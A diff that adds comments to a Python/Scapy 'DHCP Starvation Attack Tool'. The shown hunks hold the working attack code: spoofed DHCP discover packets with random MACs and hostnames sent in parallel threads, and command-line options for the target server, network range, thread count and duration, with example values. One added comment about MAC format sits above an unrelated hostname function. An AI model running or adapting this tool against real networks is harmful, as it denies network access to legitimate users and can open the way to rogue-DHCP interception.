@@ -9,6 +9,7 @@ import ipaddress
 used_hostnames = set() 
 hostnames_lock = threading.Lock() 
 
+# Function to generate unique hostnames, the MAC is in bytes format
 def generate_unique_hostname(): 
     while True: 
         name = f"fake-client-{randint(1, 10000)}"
@@ -60,7 +61,7 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
                            BOOTP(chaddr=mac2str(mac), xid=randint(1, 0xFFFFFFFF)) / \
-                           DHCP(options=[("message-type", "discover"),
+                           DHCP(options=[("message-type", "discover"),  # sets packet[DHCP].options[0][1] = 1
                                         ("client_id", mac),
                                         ("hostname", hostname),
                                         ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
@@ -70,7 +71,7 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
             sendp(dhcp_discover, iface=interface, verbose=0) # via Scapy
             time.sleep(0.01)  # Small delay to avoid overwhelming the system
 
-    # Start multiple threads for more effective starvation
+    # Threads to perform the DHCP starvation attack parallelly
     threads = []
     for _ in range(num_threads):
         t = threading.Thread(target=starvation_thread)
@@ -83,11 +84,11 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DHCP Starvation Attack Tool")
-    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
-    parser.add_argument("-s", "--server", required=True, help="Target DHCP server IP")
-    parser.add_argument("-n", "--network", required=True, help="Network range to attack (e.g., 192.168.1.0/24)")
-    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use")
-    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
+    parser.add_argument("-i", "--interface", required=True, help="Network interface to use") # -i eth0
+    parser.add_argument("-s", "--server", required=True, help="Target DHCP server IP") # -s 192.168.1.1
+    parser.add_argument("-n", "--network", required=True, help="Network range to attack (e.g., 192.168.1.0/24)") # -n 192.168.1.0/24
+    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use") # -t 5 
+    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds") # -d 60
     
     args = parser.parse_args()
     
